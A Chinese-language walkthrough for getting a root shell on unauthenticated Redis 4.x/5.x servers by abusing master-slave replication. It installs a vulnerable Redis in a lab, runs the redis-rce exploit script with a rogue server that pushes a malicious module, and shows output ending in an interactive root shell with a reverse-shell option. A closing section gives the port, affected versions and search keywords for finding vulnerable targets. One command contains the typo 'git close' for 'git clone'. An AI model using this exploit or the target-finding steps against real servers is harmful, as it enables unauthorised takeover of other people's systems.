# Redis未授权通过主从复制GETSHELL


## 0x01 环境搭建

 靶机kali，ip地址192.168.1.16，安装redis服务命令。  

 wget http://download.redis.io/releases/redis-5.0.0.tar.gz  
 tar xzf redis-5.0.0.tar.gz  
 cd redis-5.0.0  
 make  


 编译好然后修改redis.conf文件，把127.0.0.1 改成 0.0.0.0  启动服务。  


 ./redis-server /root/redis-5.0.0/redis.conf  

 ![1](https://github.com/greekn/Tao-loophole-demo/blob/master/cve-rule/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GETSHELL/1.jpg)

## 0x02 漏洞利用

  攻击机Ubuntu，ip地址192.168.1.107，下载exp脚本，然后输入参数开始。

  git close https://github.com/Ridter/redis-rce  
  cd redis-rce  
  greekn@greekn:~/redis-rce$ python3 redis-rce.py -r 192.168.1.16 -L 192.168.1.107 -f exp_lin.so  

  █▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄         █▄▄▄▄ ▄█▄    ▄███▄       
  █  ▄▀ █▀   ▀  █  █  ██   █     ▀▄       █  ▄▀ █▀ ▀▄  █▀   ▀  
  █▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄         █▀▀▌  █   ▀  ██▄▄        
  █  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀          █  █  █▄  ▄▀ █▄   ▄▀  
    █   ▀███▀   ███▀   ▐                    █   ▀███▀  ▀███▀        
  ▀                                       ▀                       
  
 [*] Connecting to  192.168.1.16:6379...  
 [*] Sending SLAVEOF command to server  
 [+] Accepted connection from 192.168.1.16:6379  
 [*] Setting filename  
 [+] Accepted connection from 192.168.1.16:6379  
 [*] Start listening on 192.168.1.107:21000  
 [*] Tring to run payload  
 [+] Accepted connection from 192.168.1.16:38875  
 [*] Closing rogue server...  

 [+] What do u want ? [i]nteractive shell or [r]everse shell: i  
 [+] Interactive shell open , use "exit" to exit...  
 $ whoami  
 root  
 $   

 ![2](https://github.com/greekn/Tao-loophole-demo/blob/master/cve-rule/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GETSHELL/2.jpg)

## 0x03 脆弱目标寻找  

 漏洞关键词redis 默认端口6379，影响版本 4.x/5.x  

 ![3](https://github.com/greekn/Tao-loophole-demo/blob/master/cve-rule/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GETSHELL/3.jpg)

 参考链接 https://paper.seebug.org/975/  

 ![4](https://github.com/greekn/Tao-loophole-demo/blob/master/cve-rule/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GETSHELL/4.jpg)

